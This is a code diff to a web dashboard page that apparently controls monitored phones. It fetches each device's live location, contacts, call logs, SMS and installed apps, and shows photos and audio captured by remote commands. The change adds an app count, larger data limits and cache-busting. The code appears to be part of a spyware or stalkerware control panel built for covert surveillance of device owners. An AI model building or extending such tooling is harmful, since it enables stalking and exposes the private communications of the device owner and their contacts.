@@ -20,6 +20,7 @@ export default function DeviceDetailPage() {
   const [messages, setMessages] = useState<DeviceMessage[]>([]);
   const [captures, setCaptures] = useState<any[]>([]);
   const [audioClips, setAudioClips] = useState<AudioCapture[]>([]);
+  const [appCount, setAppCount] = useState(0);
   const [activeTab, setActiveTab] = useState("map");
   const [loading, setLoading] = useState(true);
   const [toast, setToast] = useState<string | null>(null);
@@ -32,13 +33,16 @@ export default function DeviceDetailPage() {
   const fetchDeviceData = useCallback(async () => {
     if (!deviceId) return;
     try {
-      const [devRes, locRes, conRes, callRes, msgRes, cmdRes] = await Promise.all([
-        fetch(`/api/devices/${deviceId}`).then((r) => r.json()),
-        fetch(`/api/devices/${deviceId}/data?type=locations&limit=50`).then((r) => r.json()),
-        fetch(`/api/devices/${deviceId}/data?type=contacts&limit=200`).then((r) => r.json()),
-        fetch(`/api/devices/${deviceId}/data?type=calls&limit=100`).then((r) => r.json()),
-        fetch(`/api/devices/${deviceId}/data?type=messages&limit=100`).then((r) => r.json()),
-        fetch(`/api/devices/${deviceId}/commands`).then((r) => r.json()),
+      const t = Date.now();
+      const noStore = { cache: "no-store" as RequestCache, headers: { "Cache-Control": "no-cache" } };
+      const [devRes, locRes, conRes, callRes, msgRes, appRes, cmdRes] = await Promise.all([
+        fetch(`/api/devices/${deviceId}?_t=${t}`, noStore).then((r) => r.json()),
+        fetch(`/api/devices/${deviceId}/data?type=locations&limit=50&_t=${t}`, noStore).then((r) => r.json()),
+        fetch(`/api/devices/${deviceId}/data?type=contacts&limit=500&_t=${t}`, noStore).then((r) => r.json()),
+        fetch(`/api/devices/${deviceId}/data?type=calls&limit=200&_t=${t}`, noStore).then((r) => r.json()),
+        fetch(`/api/devices/${deviceId}/data?type=messages&limit=100&_t=${t}`, noStore).then((r) => r.json()),
+        fetch(`/api/devices/${deviceId}/data?type=apps&limit=200&_t=${t}`, noStore).then((r) => r.json()),
+        fetch(`/api/devices/${deviceId}/commands?_t=${t}`, noStore).then((r) => r.json()),
       ]);
 
       if (devRes.device) setDevice(devRes.device);
@@ -46,6 +50,7 @@ export default function DeviceDetailPage() {
       if (conRes.contacts) setContacts(conRes.contacts);
       if (callRes.calls) setCalls(callRes.calls);
       if (msgRes.messages) setMessages(msgRes.messages);
+      if (appRes.apps) setAppCount(appRes.apps.length);
       if (cmdRes.commands) {
         setCaptures(cmdRes.commands.filter((c: any) => c.command === "take_photo" && c.result_media_path));
         setAudioClips(cmdRes.commands.filter((c: any) => c.command === "record_audio" && c.result_media_path));
@@ -95,7 +100,7 @@ export default function DeviceDetailPage() {
     { id: "map", label: "Live Map", icon: MapPin },
     { id: "camera", label: `Snaps (${captures.length})`, icon: Camera },
     { id: "audio", label: `Audio (${audioClips.length})`, icon: Mic },
-    { id: "apps", label: "Apps", icon: Layers },
+    { id: "apps", label: `Apps (${appCount})`, icon: Layers },
     { id: "contacts", label: `Contacts (${contacts.length})`, icon: User },
     { id: "calls", label: `Calls (${calls.length})`, icon: Phone },
     { id: "messages", label: `SMS (${messages.length})`, icon: MessageSquare },
